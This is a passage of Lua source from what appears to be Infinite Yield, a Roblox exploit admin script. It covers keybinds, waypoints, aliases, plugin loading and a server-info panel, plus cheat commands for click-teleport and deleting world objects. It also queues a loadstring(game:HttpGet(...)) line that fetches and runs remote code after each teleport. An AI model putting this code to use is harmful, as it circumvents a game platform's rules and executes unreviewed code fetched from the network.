					newbind.Text.Delete.MouseButton1Click:Connect(function()
						unkeybind(binds[i].COMMAND,binds[i].KEY)
					end)
				end
			end
		end
	
		refreshbinds()
	
		toggleOn = {}
	
		function unkeybind(cmd,key)
			for i = #binds,1,-1 do
				if binds[i].COMMAND == cmd and binds[i].KEY == key then
					toggleOn[binds[i]] = nil
					table.remove(binds, i)
				end
			end
			refreshbinds()
			updatesaves()
			if key == 'RightClick' or key == 'LeftClick' then
				notify('Keybinds Updated','Unbinded '..key..' from '..cmd)
			else
				notify('Keybinds Updated','Unbinded '..key:sub(14)..' from '..cmd)
			end
		end
	
		PositionsFrame.Delete.MouseButton1Click:Connect(function()
			execCmd('cpos')
		end)
	
		function refreshwaypoints()
			if #WayPoints > 0 or #pWayPoints > 0 then
				PositionsHint:Destroy()
			end
			if Holder_4 then
				Holder_4:ClearAllChildren()
				Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
				local YSize = 25
				local num = 1
				for i = 1, #WayPoints do
					local Position = ((num * YSize) - YSize)
					local newpoint = Example_4:Clone()
					newpoint.Parent = Holder_4
					newpoint.Visible = true
					newpoint.Position = UDim2.new(0,0,0, Position + 5)
					newpoint.Text.Text = WayPoints[i].NAME
					table.insert(shade2,newpoint)
					table.insert(shade2,newpoint.Text)
					table.insert(text1,newpoint.Text)
					table.insert(shade3,newpoint.Text.Delete)
					table.insert(text2,newpoint.Text.Delete)
					table.insert(shade3,newpoint.Text.TP)
					table.insert(text2,newpoint.Text.TP)
					Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
					newpoint.Text.Delete.MouseButton1Click:Connect(function()
						execCmd('dpos '..WayPoints[i].NAME)
					end)
					newpoint.Text.TP.MouseButton1Click:Connect(function()
						execCmd("loadpos "..WayPoints[i].NAME)
					end)
					num = num+1
				end
				for i = 1, #pWayPoints do
					local Position = ((num * YSize) - YSize)
					local newpoint = Example_4:Clone()
					newpoint.Parent = Holder_4
					newpoint.Visible = true
					newpoint.Position = UDim2.new(0,0,0, Position + 5)
					newpoint.Text.Text = pWayPoints[i].NAME
					table.insert(shade2,newpoint)
					table.insert(shade2,newpoint.Text)
					table.insert(text1,newpoint.Text)
					table.insert(shade3,newpoint.Text.Delete)
					table.insert(text2,newpoint.Text.Delete)
					table.insert(shade3,newpoint.Text.TP)
					table.insert(text2,newpoint.Text.TP)
					Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
					newpoint.Text.Delete.MouseButton1Click:Connect(function()
						execCmd('dpos '..pWayPoints[i].NAME)
					end)
					newpoint.Text.TP.MouseButton1Click:Connect(function()
						execCmd("loadpos "..pWayPoints[i].NAME)
					end)
					num = num+1
				end
			end
		end
	
		refreshwaypoints()
	
		function refreshaliases()
			if #aliases > 0 then
				AliasHint:Destroy()
			end
			if Holder_3 then
				Holder_3:ClearAllChildren()
				Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
				for i = 1, #aliases do
					local YSize = 25
					local Position = ((i * YSize) - YSize)
					local newalias = Example_3:Clone()
					newalias.Parent = Holder_3
					newalias.Visible = true
					newalias.Position = UDim2.new(0,0,0, Position + 5)
					newalias.Text.Text = aliases[i].CMD.." > "..aliases[i].ALIAS
					table.insert(shade2,newalias)
					table.insert(shade2,newalias.Text)
					table.insert(text1,newalias.Text)
					table.insert(shade3,newalias.Text.Delete)
					table.insert(text2,newalias.Text.Delete)
					Holder_3.CanvasSize = UDim2.new(0,0,0, Position + 30)
					newalias.Text.Delete.MouseButton1Click:Connect(function()
						execCmd('removealias '..aliases[i].ALIAS)
					end)
				end
			end
		end
	
		local bindChosenKeyUp = false
	
		BindTo.MouseButton1Click:Connect(function()
			awaitingInput = true
			BindTo.Text = 'Press something'
		end)
	
		BindTriggerSelect.MouseButton1Click:Connect(function()
			bindChosenKeyUp = not bindChosenKeyUp
			BindTriggerSelect.Text = bindChosenKeyUp and "KeyUp" or "KeyDown"
		end)
	
		newToggle = false
		Cmdbar_3.Parent.Visible = false
		On_2.MouseButton1Click:Connect(function()
			if newToggle == false then newToggle = true
				On_2.BackgroundTransparency = 0
				Cmdbar_3.Parent.Visible = true
				BindTriggerSelect.Visible = false
			else newToggle = false
				On_2.BackgroundTransparency = 1
				Cmdbar_3.Parent.Visible = false
				BindTriggerSelect.Visible = true
			end
		end)
	
		Add_2.MouseButton1Click:Connect(function()
			if keySelected then
				if string.find(Cmdbar_2.Text, "\\\\") or string.find(Cmdbar_3.Text, "\\\\") then
					notify('Keybind Error','Only use one backslash to keybind multiple commands into one keybind or command')
				else
					if newToggle and Cmdbar_3.Text ~= '' and Cmdbar_2.text ~= '' then
						addbind(Cmdbar_2.Text,keyPressed,false,Cmdbar_3.Text)
					elseif not newToggle and Cmdbar_2.text ~= '' then
						addbind(Cmdbar_2.Text,keyPressed,bindChosenKeyUp)
					else
						return
					end
					refreshbinds()
					updatesaves()
					if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
						notify('Keybinds Updated','Binded '..keyPressed..' to '..Cmdbar_2.Text..(newToggle and " / "..Cmdbar_3.Text or ""))
					else
						notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to '..Cmdbar_2.Text..(newToggle and " / "..Cmdbar_3.Text or ""))
					end
				end
			end
		end)
	
		Exit_2.MouseButton1Click:Connect(function()
			Cmdbar_2.Text = 'Command'
			Cmdbar_3.Text = 'Command 2'
			BindTo.Text = 'Click to bind'
			bindChosenKeyUp = false
			BindTriggerSelect.Text = "KeyDown"
			keySelected = false
			KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		end)
	
		function onInputBegan(input,gameProcessed)
			if awaitingInput then
				if input.UserInputType == Enum.UserInputType.Keyboard then
					keyPressed = tostring(input.KeyCode)
					BindTo.Text = keyPressed:sub(14)
				elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
					keyPressed = 'LeftClick'
					BindTo.Text = 'LeftClick'
				elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
					keyPressed = 'RightClick'
					BindTo.Text = 'RightClick'
				end
				awaitingInput = false
				keySelected = true
			end
			if not gameProcessed and #binds > 0 then
				for i,v in pairs(binds) do
					if not v.ISKEYUP then
						if (input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower()) or (input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick') or (input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick') then
							if v.TOGGLE then
								local isOn = toggleOn[v] == true
								toggleOn[v] = not isOn
								if isOn then
									execCmd(v.TOGGLE,Players.LocalPlayer)
								else
									execCmd(v.COMMAND,Players.LocalPlayer)
								end
							else
								execCmd(v.COMMAND,Players.LocalPlayer)
							end
						end
					end
				end
			end
		end
	
		function onInputEnded(input,gameProcessed)
			if not gameProcessed and #binds > 0 then
				for i,v in pairs(binds) do
					if v.ISKEYUP then
						if (input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower()) or (input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick') or (input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick') then
							execCmd(v.COMMAND,Players.LocalPlayer)
						end
					end
				end
			end
		end
	
		UserInputService.InputBegan:Connect(onInputBegan)
		UserInputService.InputEnded:Connect(onInputEnded)
	
		ClickTP.Select.MouseButton1Click:Connect(function()
			if keySelected then
				addbind('clicktp',keyPressed,bindChosenKeyUp)
				refreshbinds()
				updatesaves()
				if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
					notify('Keybinds Updated','Binded '..keyPressed..' to click tp')
				else
					notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click tp')
				end
			end
		end)
	
		ClickDelete.Select.MouseButton1Click:Connect(function()
			if keySelected then
				addbind('clickdel',keyPressed,bindChosenKeyUp)
				refreshbinds()
				updatesaves()
				if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
					notify('Keybinds Updated','Binded '..keyPressed..' to click delete')
				else
					notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click delete')
				end
			end
		end)
	
		local function clicktpFunc()
			pcall(function()
				local character = Players.LocalPlayer.Character
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid and humanoid.SeatPart then
					humanoid.Sit = false
					wait(0.1)
				end
	
				local hipHeight = humanoid and humanoid.HipHeight > 0 and (humanoid.HipHeight + 1)
				local rootPart = getRoot(character)
				local rootPartPosition = rootPart.Position
				local hitPosition = IYMouse.Hit.Position
				local newCFrame = CFrame.new(
					hitPosition, 
					Vector3.new(rootPartPosition.X, hitPosition.Y, rootPartPosition.Z)
				) * CFrame.Angles(0, math.pi, 0)
	
				rootPart.CFrame = newCFrame + Vector3.new(0, hipHeight or 4, 0)
			end)
		end
	
		IYMouse.Button1Down:Connect(function()
			for i,v in pairs(binds) do
				if v.COMMAND == 'clicktp' then
					local input = v.KEY
					if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
						clicktpFunc()
					elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
						clicktpFunc()
					elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) and Players.LocalPlayer.Character then
						clicktpFunc()
					end
				elseif v.COMMAND == 'clickdel' then
					local input = v.KEY
					if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
						pcall(function() IYMouse.Target:Destroy() end)
					elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
						pcall(function() IYMouse.Target:Destroy() end)
					elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) then
						pcall(function() IYMouse.Target:Destroy() end)
					end
				end
			end
		end)
	
		PluginsGUI = PluginEditor.background
	
		function addPlugin(name)
			if name:lower() == 'plugin file name' or name:lower() == 'iy_fe.iy' or name == 'iy_fe' then
				notify('Plugin Error','Please enter a valid plugin')
			else
				local file
				local fileName
				if name:sub(-3) == '.iy' then
					pcall(function() file = readfile(name) end)
					fileName = name
				else
					pcall(function() file = readfile(name..'.iy') end)
					fileName = name..'.iy'
				end
				if file then
					if not FindInTable(PluginsTable, fileName) then
						table.insert(PluginsTable, fileName)
						LoadPlugin(fileName)
						refreshplugins()
						pcall(eventEditor.Refresh)
					else
						notify('Plugin Error','This plugin is already added')
					end
				else
					notify('Plugin Error','Cannot locate file "'..fileName..'". Is the file in the correct folder?')
				end
			end
		end
	
		function deletePlugin(name)
			local pName = name..'.iy'
			if name:sub(-3) == '.iy' then
				pName = name
			end
			for i = #cmds,1,-1 do
				if cmds[i].PLUGIN == pName then
					table.remove(cmds, i)
				end
			end
			for i,v in pairs(CMDsF:GetChildren()) do
				if v.Name == 'PLUGIN_'..pName then
					v:Destroy()
				end
			end
			for i,v in pairs(PluginsTable) do
				if v == pName then
					table.remove(PluginsTable, i)
					notify('Removed Plugin',pName..' was removed')
				end
			end
			IndexContents('',true)
			refreshplugins()
		end
	
		function refreshplugins(dontSave)
			if #PluginsTable > 0 then
				PluginsHint:Destroy()
			end
			if Holder_5 then
				Holder_5:ClearAllChildren()
				Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
				for i,v in pairs(PluginsTable) do
					local pName = v
					local YSize = 25
					local Position = ((i * YSize) - YSize)
					local newplugin = Example_5:Clone()
					newplugin.Parent = Holder_5
					newplugin.Visible = true
					newplugin.Position = UDim2.new(0,0,0, Position + 5)
					newplugin.Text.Text = pName
					table.insert(shade2,newplugin)
					table.insert(shade2,newplugin.Text)
					table.insert(text1,newplugin.Text)
					table.insert(shade3,newplugin.Text.Delete)
					table.insert(text2,newplugin.Text.Delete)
					Holder_5.CanvasSize = UDim2.new(0,0,0, Position + 30)
					newplugin.Text.Delete.MouseButton1Click:Connect(function()
						deletePlugin(pName)
					end)
				end
				if not dontSave then
					updatesaves()
				end
			end
		end
	
		local PluginCache
		function LoadPlugin(val,startup)
			local plugin
	
			function CatchedPluginLoad()
				plugin = loadfile(val)()
			end
	
			function handlePluginError(plerror)
				notify('Plugin Error','An error occurred with the plugin, "'..val..'" and it could not be loaded')
				if FindInTable(PluginsTable,val) then
					for i,v in pairs(PluginsTable) do
						if v == val then
							table.remove(PluginsTable,i)
						end
					end
				end
				updatesaves()
	
				print("Original Error: "..tostring(plerror))
				print("Plugin Error, stack traceback: "..tostring(debug.traceback()))
	
				plugin = nil
	
				return false
			end
	
			xpcall(CatchedPluginLoad, handlePluginError)
	
			if plugin ~= nil then
				if not startup then
					notify('Loaded Plugin',"Name: "..plugin["PluginName"].."\n".."Description: "..plugin["PluginDescription"])
				end
				addcmdtext('',val)
				addcmdtext(string.upper('--'..plugin["PluginName"]),val,plugin["PluginDescription"])
				if plugin["Commands"] then
					for i,v in pairs(plugin["Commands"]) do 
						local cmdExt = ''
						local cmdName = i
						local function handleNames()
							cmdName = i
							if findCmd(cmdName..cmdExt) then
								if isNumber(cmdExt) then
									cmdExt = cmdExt+1
								else
									cmdExt = 1
								end
								handleNames()
							else
								cmdName = cmdName..cmdExt
							end
						end
						handleNames()
						addcmd(cmdName, v["Aliases"], v["Function"], val)
						if v["ListName"] then
							local newName = v.ListName
							local cmdNames = {i,unpack(v.Aliases)}
							for i,v in pairs(cmdNames) do
								newName = newName:gsub(v,v..cmdExt)
							end
							addcmdtext(newName,val,v["Description"])
						else
							addcmdtext(cmdName,val,v["Description"])
						end
					end
				end
				IndexContents('',true)
			elseif plugin == nil then
				plugin = nil
			end
		end
	
		function FindPlugins()
			if PluginsTable ~= nil and type(PluginsTable) == "table" then
				for i,v in pairs(PluginsTable) do
					LoadPlugin(v,true)
				end
				refreshplugins(true)
			end
		end
	
		AddPlugin.MouseButton1Click:Connect(function()
			addPlugin(PluginsGUI.FileName.Text)
		end)
	
		Exit_3.MouseButton1Click:Connect(function()
			PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
			FileName.Text = 'Plugin File Name'
		end)
	
		Add_3.MouseButton1Click:Connect(function()
			PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 310), "InOut", "Quart", 0.5, true, nil)
		end)
	
		Plugins.MouseButton1Click:Connect(function()
			if writefileExploit() then
				PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
				wait(0.5)
				SettingsHolder.Visible = false
			else
				notify('Incompatible Exploit','Your exploit is unable to use plugins (missing read/writefile)')
			end
		end)
	
		Close_4.MouseButton1Click:Connect(function()
			SettingsHolder.Visible = true
			PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
		end)
	
		local TeleportCheck = false
		Players.LocalPlayer.OnTeleport:Connect(function(State)
			if KeepInfYield and (not TeleportCheck) and queueteleport then
				TeleportCheck = true
				queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
			end
		end)
	
		addcmd('addalias',{},function(args, speaker)
			if #args < 2 then return end
			local cmd = string.lower(args[1])
			local alias = string.lower(args[2])
			for i,v in pairs(cmds) do
				if v.NAME:lower()==cmd or FindInTable(v.ALIAS,cmd) then
					customAlias[alias] = v
					aliases[#aliases + 1] = {CMD = cmd, ALIAS = alias}
					notify('Aliases Modified',"Added "..alias.." as an alias to "..cmd)
					updatesaves()
					refreshaliases()
					break
				end
			end
		end)
	
		addcmd('removealias',{},function(args, speaker)
			if #args < 1 then return end
			local alias = string.lower(args[1])
			if customAlias[alias] then
				local cmd = customAlias[alias].NAME
				customAlias[alias] = nil
				for i = #aliases,1,-1 do
					if aliases[i].ALIAS == tostring(alias) then
						table.remove(aliases, i)
					end
				end
				notify('Aliases Modified',"Removed the alias "..alias.." from "..cmd)
				updatesaves()
				refreshaliases()
			end
		end)
	
		addcmd('clraliases',{},function(args, speaker)
			customAlias = {}
			aliases = {}
			notify('Aliases Modified','Removed all aliases')
			updatesaves()
			refreshaliases()
		end)
	
		addcmd('discord', {'support', 'help'}, function(args, speaker)
			if everyClipboard then
				toClipboard('https://discord.com/invite/dYHag43eeU')
				notify('Discord Invite', 'Copied to clipboard!\ndiscord.gg/dYHag43eeU')
			else
				notify('Discord Invite', 'discord.gg/dYHag43eeU')
			end
			if httprequest then
				httprequest({
					Url = 'http://127.0.0.1:6463/rpc?v=1',
					Method = 'POST',
					Headers = {
						['Content-Type'] = 'application/json',
						Origin = 'https://discord.com'
					},
					Body = HttpService:JSONEncode({
						cmd = 'INVITE_BROWSER',
						nonce = HttpService:GenerateGUID(false),
						args = {code = 'dYHag43eeU'}
					})
				})
			end
		end)
	
		addcmd('keepiy', {}, function(args, speaker)
			if queueteleport then
				KeepInfYield = true
				updatesaves()
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing queue_on_teleport)')
			end
		end)
	
		addcmd('unkeepiy', {}, function(args, speaker)
			if queueteleport then
				KeepInfYield = false
				updatesaves()
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing queue_on_teleport)')
			end
		end)
	
		addcmd('togglekeepiy', {}, function(args, speaker)
			if queueteleport then
				KeepInfYield = not KeepInfYield
				updatesaves()
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing queue_on_teleport)')
			end
		end)
	
		local canOpenServerinfo = true
		addcmd('serverinfo',{'info','sinfo'},function(args, speaker)
			if not canOpenServerinfo then return end
			canOpenServerinfo = false
			task.spawn(function()
				local FRAME = Instance.new("Frame")
				local shadow = Instance.new("Frame")
				local PopupText = Instance.new("TextLabel")
				local Exit = Instance.new("TextButton")
				local ExitImage = Instance.new("ImageLabel")
				local background = Instance.new("Frame")
				local TextLabel = Instance.new("TextLabel")
				local TextLabel2 = Instance.new("TextLabel")
				local TextLabel3 = Instance.new("TextLabel")
				local Time = Instance.new("TextLabel")
				local appearance = Instance.new("TextLabel")
				local maxplayers = Instance.new("TextLabel")
				local name = Instance.new("TextLabel")
				local placeid = Instance.new("TextLabel")
				local playerid = Instance.new("TextLabel")
				local players = Instance.new("TextLabel")
				local CopyApp = Instance.new("TextButton")
				local CopyPlrID = Instance.new("TextButton")
				local CopyPlcID = Instance.new("TextButton")
				local CopyPlcName = Instance.new("TextButton")
	
				FRAME.Name = randomString()
				FRAME.Parent = ScaledHolder
				FRAME.Active = true
				FRAME.BackgroundTransparency = 1
				FRAME.Position = UDim2.new(0.5, -130, 0, -500)
				FRAME.Size = UDim2.new(0, 250, 0, 20)
				FRAME.ZIndex = 10
				dragGUI(FRAME)
	
				shadow.Name = "shadow"
				shadow.Parent = FRAME
				shadow.BackgroundColor3 = currentShade2
				shadow.BorderSizePixel = 0
				shadow.Size = UDim2.new(0, 250, 0, 20)
				shadow.ZIndex = 10
				table.insert(shade2,shadow)
	
				PopupText.Name = "PopupText"
				PopupText.Parent = shadow
				PopupText.BackgroundTransparency = 1
				PopupText.Size = UDim2.new(1, 0, 0.95, 0)
				PopupText.ZIndex = 10
				PopupText.Font = Enum.Font.SourceSans
				PopupText.TextSize = 14
				PopupText.Text = "Server"
				PopupText.TextColor3 = currentText1
				PopupText.TextWrapped = true
				table.insert(text1,PopupText)
	
				Exit.Name = "Exit"
				Exit.Parent = shadow
				Exit.BackgroundTransparency = 1
				Exit.Position = UDim2.new(1, -20, 0, 0)
				Exit.Size = UDim2.new(0, 20, 0, 20)
				Exit.Text = ""
				Exit.ZIndex = 10
	
				ExitImage.Parent = Exit
				ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
				ExitImage.BackgroundTransparency = 1
				ExitImage.Position = UDim2.new(0, 5, 0, 5)
				ExitImage.Size = UDim2.new(0, 10, 0, 10)
				ExitImage.Image = getcustomasset("infiniteyield/assets/close.png")
				ExitImage.ZIndex = 10
	
				background.Name = "background"
				background.Parent = FRAME
				background.Active = true
				background.BackgroundColor3 = currentShade1
				background.BorderSizePixel = 0
				background.Position = UDim2.new(0, 0, 1, 0)
				background.Size = UDim2.new(0, 250, 0, 250)
				background.ZIndex = 10
				table.insert(shade1,background)
	
				TextLabel.Name = "Text Label"
				TextLabel.Parent = background
				TextLabel.BackgroundTransparency = 1
				TextLabel.BorderSizePixel = 0
				TextLabel.Position = UDim2.new(0, 5, 0, 80)
				TextLabel.Size = UDim2.new(0, 100, 0, 20)
				TextLabel.ZIndex = 10
				TextLabel.Font = Enum.Font.SourceSansLight
				TextLabel.TextSize = 20
				TextLabel.Text = "Run Time:"
				TextLabel.TextColor3 = currentText1
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,TextLabel)
	
				TextLabel2.Name = "Text Label2"
				TextLabel2.Parent = background
				TextLabel2.BackgroundTransparency = 1
				TextLabel2.BorderSizePixel = 0
				TextLabel2.Position = UDim2.new(0, 5, 0, 130)
				TextLabel2.Size = UDim2.new(0, 100, 0, 20)
				TextLabel2.ZIndex = 10
				TextLabel2.Font = Enum.Font.SourceSansLight
				TextLabel2.TextSize = 20
				TextLabel2.Text = "Statistics:"
				TextLabel2.TextColor3 = currentText1
				TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,TextLabel2)
	
				TextLabel3.Name = "Text Label3"
				TextLabel3.Parent = background
				TextLabel3.BackgroundTransparency = 1
				TextLabel3.BorderSizePixel = 0
				TextLabel3.Position = UDim2.new(0, 5, 0, 10)
				TextLabel3.Size = UDim2.new(0, 100, 0, 20)
				TextLabel3.ZIndex = 10
				TextLabel3.Font = Enum.Font.SourceSansLight
				TextLabel3.TextSize = 20
				TextLabel3.Text = "Local Player:"
				TextLabel3.TextColor3 = currentText1
				TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,TextLabel3)
	
				Time.Name = "Time"
				Time.Parent = background
				Time.BackgroundTransparency = 1
				Time.BorderSizePixel = 0
				Time.Position = UDim2.new(0, 5, 0, 105)
				Time.Size = UDim2.new(0, 100, 0, 20)
				Time.ZIndex = 10
				Time.Font = Enum.Font.SourceSans
				Time.FontSize = Enum.FontSize.Size14
				Time.Text = "LOADING"
				Time.TextColor3 = currentText1
				Time.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,Time)
	
				appearance.Name = "appearance"
				appearance.Parent = background
				appearance.BackgroundTransparency = 1
				appearance.BorderSizePixel = 0
				appearance.Position = UDim2.new(0, 5, 0, 55)
				appearance.Size = UDim2.new(0, 100, 0, 20)
				appearance.ZIndex = 10
				appearance.Font = Enum.Font.SourceSans
				appearance.FontSize = Enum.FontSize.Size14
				appearance.Text = "Appearance: LOADING"
				appearance.TextColor3 = currentText1
				appearance.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,appearance)
	
				maxplayers.Name = "maxplayers"
				maxplayers.Parent = background
				maxplayers.BackgroundTransparency = 1
				maxplayers.BorderSizePixel = 0
				maxplayers.Position = UDim2.new(0, 5, 0, 175)
				maxplayers.Size = UDim2.new(0, 100, 0, 20)
				maxplayers.ZIndex = 10
				maxplayers.Font = Enum.Font.SourceSans
				maxplayers.FontSize = Enum.FontSize.Size14
				maxplayers.Text = "LOADING"
				maxplayers.TextColor3 = currentText1
				maxplayers.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,maxplayers)
	
				name.Name = "name"
				name.Parent = background
				name.BackgroundTransparency = 1
				name.BorderSizePixel = 0
				name.Position = UDim2.new(0, 5, 0, 215)
				name.Size = UDim2.new(0, 240, 0, 30)
				name.ZIndex = 10
				name.Font = Enum.Font.SourceSans
				name.FontSize = Enum.FontSize.Size14
				name.Text = "Place Name: LOADING"
				name.TextColor3 = currentText1
				name.TextWrapped = true
				name.TextXAlignment = Enum.TextXAlignment.Left
				name.TextYAlignment = Enum.TextYAlignment.Top
				table.insert(text1,name)
	
				placeid.Name = "placeid"
				placeid.Parent = background
				placeid.BackgroundTransparency = 1
				placeid.BorderSizePixel = 0
				placeid.Position = UDim2.new(0, 5, 0, 195)
				placeid.Size = UDim2.new(0, 100, 0, 20)
				placeid.ZIndex = 10
				placeid.Font = Enum.Font.SourceSans
				placeid.FontSize = Enum.FontSize.Size14
				placeid.Text = "Place ID: LOADING"
				placeid.TextColor3 = currentText1
				placeid.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,placeid)
	
				playerid.Name = "playerid"
				playerid.Parent = background
				playerid.BackgroundTransparency = 1
				playerid.BorderSizePixel = 0
				playerid.Position = UDim2.new(0, 5, 0, 35)
				playerid.Size = UDim2.new(0, 100, 0, 20)
				playerid.ZIndex = 10
				playerid.Font = Enum.Font.SourceSans
				playerid.FontSize = Enum.FontSize.Size14
				playerid.Text = "Player ID: LOADING"
				playerid.TextColor3 = currentText1
				playerid.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,playerid)
	
				players.Name = "players"
				players.Parent = background
				players.BackgroundTransparency = 1
				players.BorderSizePixel = 0
				players.Position = UDim2.new(0, 5, 0, 155)
				players.Size = UDim2.new(0, 100, 0, 20)
				players.ZIndex = 10
				players.Font = Enum.Font.SourceSans
				players.FontSize = Enum.FontSize.Size14
				players.Text = "LOADING"
				players.TextColor3 = currentText1
				players.TextXAlignment = Enum.TextXAlignment.Left
				table.insert(text1,players)
	
				CopyApp.Name = "CopyApp"
				CopyApp.Parent = background
				CopyApp.BackgroundColor3 = currentShade2
				CopyApp.BorderSizePixel = 0
				CopyApp.Position = UDim2.new(0, 210, 0, 55)
				CopyApp.Size = UDim2.new(0, 35, 0, 20)
				CopyApp.Font = Enum.Font.SourceSans
				CopyApp.TextSize = 14
				CopyApp.Text = "Copy"
				CopyApp.TextColor3 = currentText1
				CopyApp.ZIndex = 10
				table.insert(shade2,CopyApp)
				table.insert(text1,CopyApp)
	
				CopyPlrID.Name = "CopyPlrID"
				CopyPlrID.Parent = background
				CopyPlrID.BackgroundColor3 = currentShade2
				CopyPlrID.BorderSizePixel = 0
				CopyPlrID.Position = UDim2.new(0, 210, 0, 35)
				CopyPlrID.Size = UDim2.new(0, 35, 0, 20)
				CopyPlrID.Font = Enum.Font.SourceSans
				CopyPlrID.TextSize = 14
				CopyPlrID.Text = "Copy"
				CopyPlrID.TextColor3 = currentText1
				CopyPlrID.ZIndex = 10
				table.insert(shade2,CopyPlrID)
				table.insert(text1,CopyPlrID)
	
				CopyPlcID.Name = "CopyPlcID"
				CopyPlcID.Parent = background
				CopyPlcID.BackgroundColor3 = currentShade2
				CopyPlcID.BorderSizePixel = 0
				CopyPlcID.Position = UDim2.new(0, 210, 0, 195)
				CopyPlcID.Size = UDim2.new(0, 35, 0, 20)
				CopyPlcID.Font = Enum.Font.SourceSans
				CopyPlcID.TextSize = 14
				CopyPlcID.Text = "Copy"
				CopyPlcID.TextColor3 = currentText1
				CopyPlcID.ZIndex = 10
				table.insert(shade2,CopyPlcID)
				table.insert(text1,CopyPlcID)
	
				CopyPlcName.Name = "CopyPlcName"
				CopyPlcName.Parent = background
				CopyPlcName.BackgroundColor3 = currentShade2
				CopyPlcName.BorderSizePixel = 0
				CopyPlcName.Position = UDim2.new(0, 210, 0, 215)
				CopyPlcName.Size = UDim2.new(0, 35, 0, 20)
				CopyPlcName.Font = Enum.Font.SourceSans
				CopyPlcName.TextSize = 14
				CopyPlcName.Text = "Copy"
				CopyPlcName.TextColor3 = currentText1
				CopyPlcName.ZIndex = 10
				table.insert(shade2,CopyPlcName)
				table.insert(text1,CopyPlcName)
	
				local SINFOGUI = background
				FRAME:TweenPosition(UDim2.new(0.5, -130, 0, 100), "InOut", "Quart", 0.5, true, nil) 
				wait(0.5)
				Exit.MouseButton1Click:Connect(function()
					FRAME:TweenPosition(UDim2.new(0.5, -130, 0, -500), "InOut", "Quart", 0.5, true, nil) 
					wait(0.6)
					FRAME:Destroy()
					canOpenServerinfo = true
				end)
				local Asset = MarketplaceService:GetProductInfo(PlaceId)
				SINFOGUI.name.Text = "Place Name: " .. Asset.Name
				SINFOGUI.playerid.Text = "Player ID: " ..speaker.UserId
				SINFOGUI.maxplayers.Text = Players.MaxPlayers.. " Players Max"
				SINFOGUI.placeid.Text = "Place ID: " ..PlaceId
	
				CopyApp.MouseButton1Click:Connect(function()
					toClipboard(speaker.CharacterAppearanceId)
				end)
				CopyPlrID.MouseButton1Click:Connect(function()
					toClipboard(speaker.UserId)
				end)
				CopyPlcID.MouseButton1Click:Connect(function()
					toClipboard(PlaceId)
				end)
				CopyPlcName.MouseButton1Click:Connect(function()
					toClipboard(Asset.Name)
				end)
	
				repeat
					players = Players:GetPlayers()
					SINFOGUI.players.Text = #players.. " Player(s)"
					SINFOGUI.appearance.Text = "Appearance: " ..speaker.CharacterAppearanceId
					local seconds = math.floor(workspace.DistributedGameTime)
					local minutes = math.floor(workspace.DistributedGameTime / 60)
					local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
					local seconds = seconds - (minutes * 60)
					local minutes = minutes - (hours * 60)
					if hours < 1 then if minutes < 1 then
							SINFOGUI.Time.Text = seconds .. " Second(s)" else
							SINFOGUI.Time.Text = minutes .. " Minute(s), " .. seconds .. " Second(s)"
						end
					else
						SINFOGUI.Time.Text = hours .. " Hour(s), " .. minutes .. " Minute(s), " .. seconds .. " Second(s)"
					end
					wait(1)
				until SINFOGUI.Parent == nil
			end)
		end)
	
		addcmd("jobid", {}, function(args, speaker)
			toClipboard("roblox://placeId=" .. PlaceId .. "&gameInstanceId=" .. JobId)
		end)
	
		addcmd('notifyjobid',{},function(args, speaker)
			notify('JobId / PlaceId',JobId..' / '..PlaceId)
		end)
	
		addcmd('breakloops',{'break'},function(args, speaker)
			lastBreakTime = tick()
		end)
	
